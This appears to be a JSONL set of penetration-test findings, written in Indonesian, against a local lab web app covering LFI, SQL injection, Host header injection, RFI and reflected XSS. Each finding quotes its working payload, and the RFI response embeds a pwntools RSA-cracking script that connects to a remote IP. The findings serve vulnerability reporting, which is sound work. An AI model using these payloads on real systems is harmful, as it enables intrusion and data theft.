{"id": 50, "risk_rating": "High", "cvss_v3_vector": "", "title": "Local File Inclusion (LFI) Vulnerability (Injection - OWASP A03:2021)", "short_description": "Input yang tidak tersanitasi, menghasilkan kerentanan LFI (Local File Inclusion)", "description": "Input yang tidak disanitasi pada parameter filename, mengakibatkan terjadinya kerentanan LFI. Hal itu ditunjukan ketika Payload /etc/passwd berhasil membaca file sistem. Respons: {\n  \"msg\": \"response, root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\n\"\n}\n", "recommendation": "Lakukan validasi dan sanitasi pada input filename.", "references": "", "technical_detail": "Input yang tidak disanitasi pada parameter filenemae, mengakibatkan terjadinya kerentanan LFI. Hal itu ditunjukan ketika Payload /etc/passwd berhasil membaca file sistem. Respons: {\n  \"msg\": \"response, root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\n\"\n}\n", "location": "Asset: `{}`\n"}
{"id": 52, "risk_rating": "High", "cvss_v3_vector": "", "title": "SQL Injection (Injection - OWASP A03:2021)", "short_description": "Aplikasi rentan terhadap SQL Injection.", "description": "Aplikasi tidak melakukan validasi input dengan benar pada parameter username. Ketika payload `' OR '1'='1' --` dikirim, server mengembalikan data sensitif: Hello, [('mike', 'kaines'), ('admin', 'admin')].", "recommendation": "Gunakan parameterized queries (prepared statements) untuk menghindari SQL Injection. Jangan pernah menggabungkan input pengguna langsung ke dalam query SQL.", "references": "", "technical_detail": "SQL Injection ditemukan pada endpoint http://host.docker.internal:13000/api/sqlivuln menggunakan payload ' OR '1'='1' --. Server merespons dengan data: Hello, [('mike', 'kaines'), ('admin', 'admin')].", "location": "Asset: `{}`\n"}
{"id": 51, "risk_rating": "Medium", "cvss_v3_vector": "", "title": "Host Header Injection (Security Missconfiguration - OWASP A05:2021)", "short_description": "Header request ditampilkan pada respon, sehingga terjadi Host Header Injection.", "description": "Header request ditampilkan pada respon, sehingga terjadi Host Header Injection. Hal itu dibuktikan ketika attacker melakukan modifikasi header host menjadi evil.com, lalu server menampilkan hasil dari nilai header host. Respons: {\n  \"msg\": \"response, <a href='evil.com'>\"\n}\n", "recommendation": "Konfigurasi kan ulang server, batasi header host.", "references": "", "technical_detail": "Header request ditampilkan pada respon, sehingga terjadi Host Header Injection. Hal itu dibuktikan ketika attacker melakukan modifikasi header host menjadi evil.com, lalu server menampilkan hasil dari nilai header host. Respons: {\n  \"msg\": \"response, <a href='evil.com'>\"\n}\n", "location": "Asset: `{}`\n"}
{"id": 53, "risk_rating": "Medium", "cvss_v3_vector": "", "title": "Remote File Inclusion (Injection - OWASP A05:2021)", "short_description": "Input yang tidak tersanitasi, menghasilkan kerentanan RFI (Remote File Inclusion)", "description": "Input yang tidak disanitasi pada parameter imagelink, mengakibatkan terjadinya kerentanan RFI yang dapat dimanfaatkan attacker untuk menaruh file dari luar server masuk ke dalam server. Hal itu ditunjukan ketika Payload https://pastebin.com/raw/hj8Xr28w berhasil menampilkan isi file walaupun file berada diluar server. Respons: {\n  \"msg\": \"response, import re\\r\\nfrom pwn import *\\r\\nfrom sympy.solvers import solve\\r\\nfrom sympy import Symbol\\r\\n\\r\\ntoken = ''\\r\\n\\r\\ndef cf_expansion(n, d):\\r\\n    e = []\\r\\n\\r\\n    q = n // d\\r\\n    r = n % d\\r\\n    e.append(q)\\r\\n\\r\\n    while r != 0:\\r\\n        n, d = d, r\\r\\n        q = n // d\\r\\n        r = n % d\\r\\n        e.append(q)\\r\\n\\r\\n    return e\\r\\n\\r\\ndef get_convergents(e):\\r\\n    n = []\\r\\n    d = []\\r\\n\\r\\n    for i in range(len(e)):\\r\\n        if i == 0:\\r\\n            ni = e[i]\\r\\n            di = 1\\r\\n        elif i == 1:\\r\\n            ni = e[i]*e[i-1] + 1\\r\\n            di = e[i]\\r\\n        else: # i > 1\\r\\n            ni = e[i]*n[i-1] + n[i-2]\\r\\n            di = e[i]*d[i-1] + d[i-2]\\r\\n\\r\\n        n.append(ni)\\r\\n        d.append(di)\\r\\n        yield (ni, di)\\r\\n\\r\\n\\r\\ndef wiener(N, e):\\r\\n    cf = cf_expansion(N, e)\\r\\n    conv = get_convergents(cf)\\r\\n\\r\\n    for pd, pk in conv:\\r\\n        if pk == 0:\\r\\n            continue\\r\\n\\r\\n        possible_phi = (e*pd - 1)//pk\\r\\n        \\r\\n        x = Symbol('x', integer=True)\\r\\n        roots = solve(x**2 + (possible_phi - N - 1)*x + N, x)\\r\\n\\r\\n        if len(roots) == 2:\\r\\n            p, q = roots\\r\\n\\r\\n            if p * q == N:\\r\\n                return pd\\r\\n\\r\\ndef crackRSA(ms):\\r\\n    global token\\r\\n    e = int(re.search('e \\\\= (.*)\\\\n', ms).group(1))\\r\\n    N = int(re.search('n \\\\= (.*)\\\\n', ms).group(1))\\r\\n    c = int(re.search('c \\\\= (.*)\\\\n', ms).group(1))\\r\\n\\r\\n    d = wiener(N, e)\\r\\n    m = pow(c,d,N)\\r\\n\\r\\n    token += str(m)+'-'\\r\\n\\r\\n    return m\\r\\n\\r\\nr = remote('103.200.7.150',9001)\\r\\nr.recvuntil('>>> ')\\r\\nr.sendline('1')\\r\\nres = r.recvuntil('P = ')\\r\\nprint res\\r\\n\\r\\n\\r\\nP = crackRSA(res)\\r\\nr.sendline(str(P))\\r\\nprint r.recvuntil('[1|2|3]>>>')\\r\\nr.sendline('2')\\r\\nres = r.recvuntil('P = ')\\r\\nprint res\\r\\n\\r\\nP = crackRSA(res)\\r\\nr.sendline(str(P))\\r\\nres = r.recvuntil('P = ')\\r\\nprint res\\r\\nP = crackRSA(res)\\r\\nr.sendline(str(P))\\r\\n\\r\\nres = r.recvuntil('P = ')\\r\\nprint res\\r\\nP = crackRSA(res)\\r\\nr.sendline(str(P))\\r\\nres = r.recvuntil('P = ')\\r\\nprint res\\r\\nP = crackRSA(res)\\r\\nr.sendline(str(P))\\r\\n\\r\\nres = r.recvuntil('P = ')\\r\\nprint res\\r\\nP = crackRSA(res)\\r\\nr.sendline(str(P))\\r\\n\\r\\nprint r.recvuntil('>>>')\\r\\n#r.sendline('3')\\r\\n#print r.recvline()\\r\\n#print r.recvline()\\r\\nprint token\\r\\nr.interactive()\"\n}\n", "recommendation": "Lakukan validasi dan sanitasi pada input imagelink.", "references": "", "technical_detail": "Input yang tidak disanitasi pada parameter imagelink, mengakibatkan terjadinya kerentanan RFI yang dapat dimanfaatkan attacker untuk menaruh file dari luar server masuk ke dalam server. Hal itu ditunjukan ketika Payload https://pastebin.com/raw/hj8Xr28w berhasil menampilkan isi file walaupun file berada diluar server. Respons: {\n  \"msg\": \"response, import re\\r\\nfrom pwn import *\\r\\nfrom sympy.solvers import solve\\r\\nfrom sympy import Symbol\\r\\n\\r\\ntoken = ''\\r\\n\\r\\ndef cf_expansion(n, d):\\r\\n    e = []\\r\\n\\r\\n    q = n // d\\r\\n    r = n % d\\r\\n    e.append(q)\\r\\n\\r\\n    while r != 0:\\r\\n        n, d = d, r\\r\\n        q = n // d\\r\\n        r = n % d\\r\\n        e.append(q)\\r\\n\\r\\n    return e\\r\\n\\r\\ndef get_convergents(e):\\r\\n    n = []\\r\\n    d = []\\r\\n\\r\\n    for i in range(len(e)):\\r\\n        if i == 0:\\r\\n            ni = e[i]\\r\\n            di = 1\\r\\n        elif i == 1:\\r\\n            ni = e[i]*e[i-1] + 1\\r\\n            di = e[i]\\r\\n        else: # i > 1\\r\\n            ni = e[i]*n[i-1] + n[i-2]\\r\\n            di = e[i]*d[i-1] + d[i-2]\\r\\n\\r\\n        n.append(ni)\\r\\n        d.append(di)\\r\\n        yield (ni, di)\\r\\n\\r\\n\\r\\ndef wiener(N, e):\\r\\n    cf = cf_expansion(N, e)\\r\\n    conv = get_convergents(cf)\\r\\n\\r\\n    for pd, pk in conv:\\r\\n        if pk == 0:\\r\\n            continue\\r\\n\\r\\n        possible_phi = (e*pd - 1)//pk\\r\\n        \\r\\n        x = Symbol('x', integer=True)\\r\\n        roots = solve(x**2 + (possible_phi - N - 1)*x + N, x)\\r\\n\\r\\n        if len(roots) == 2:\\r\\n            p, q = roots\\r\\n\\r\\n            if p * q == N:\\r\\n                return pd\\r\\n\\r\\ndef crackRSA(ms):\\r\\n    global token\\r\\n    e = int(re.search('e \\\\= (.*)\\\\n', ms).group(1))\\r\\n    N = int(re.search('n \\\\= (.*)\\\\n', ms).group(1))\\r\\n    c = int(re.search('c \\\\= (.*)\\\\n', ms).group(1))\\r\\n\\r\\n    d = wiener(N, e)\\r\\n    m = pow(c,d,N)\\r\\n\\r\\n    token += str(m)+'-'\\r\\n\\r\\n    return m\\r\\n\\r\\nr = remote('103.200.7.150',9001)\\r\\nr.recvuntil('>>> ')\\r\\nr.sendline('1')\\r\\nres = r.recvuntil('P = ')\\r\\nprint res\\r\\n\\r\\n\\r\\nP = crackRSA(res)\\r\\nr.sendline(str(P))\\r\\nprint r.recvuntil('[1|2|3]>>>')\\r\\nr.sendline('2')\\r\\nres = r.recvuntil('P = ')\\r\\nprint res\\r\\n\\r\\nP = crackRSA(res)\\r\\nr.sendline(str(P))\\r\\nres = r.recvuntil('P = ')\\r\\nprint res\\r\\nP = crackRSA(res)\\r\\nr.sendline(str(P))\\r\\n\\r\\nres = r.recvuntil('P = ')\\r\\nprint res\\r\\nP = crackRSA(res)\\r\\nr.sendline(str(P))\\r\\nres = r.recvuntil('P = ')\\r\\nprint res\\r\\nP = crackRSA(res)\\r\\nr.sendline(str(P))\\r\\n\\r\\nres = r.recvuntil('P = ')\\r\\nprint res\\r\\nP = crackRSA(res)\\r\\nr.sendline(str(P))\\r\\n\\r\\nprint r.recvuntil('>>>')\\r\\n#r.sendline('3')\\r\\n#print r.recvline()\\r\\n#print r.recvline()\\r\\nprint token\\r\\nr.interactive()\"\n}\n", "location": "Asset: `{}`\n"}
{"id": 54, "risk_rating": "Medium", "cvss_v3_vector": "", "title": "Cross-Site Scripting (Injection - OWASP A05:2021)", "short_description": "Input yang tidak tersanitasi, menghasilkan kerentanan XSS (Cross-Site Scripting) Reflected", "description": "Input yang tidak disanitasi pada parameter username, mengakibatkan terjadinya kerentanan XSS Reflected. Hal itu ditunjukan ketika Payload <script>alert('XSS');</script> berhasil dikembalikan tanpa ada sanitasi output. Respons: {\n  \"msg\": \"Hello, <script>alert('XSS');</script>\"\n}\n", "recommendation": "Lakukan validasi dan sanitasi pada input maupun output username.", "references": "", "technical_detail": "Input yang tidak disanitasi pada parameter username, mengakibatkan terjadinya kerentanan XSS Reflected. Hal itu ditunjukan ketika Payload <script>alert('XSS');</script> berhasil dikembalikan tanpa ada sanitasi output. Respons: {\n  \"msg\": \"Hello, <script>alert('XSS');</script>\"\n}\n", "location": "Asset: `{}`\n"}
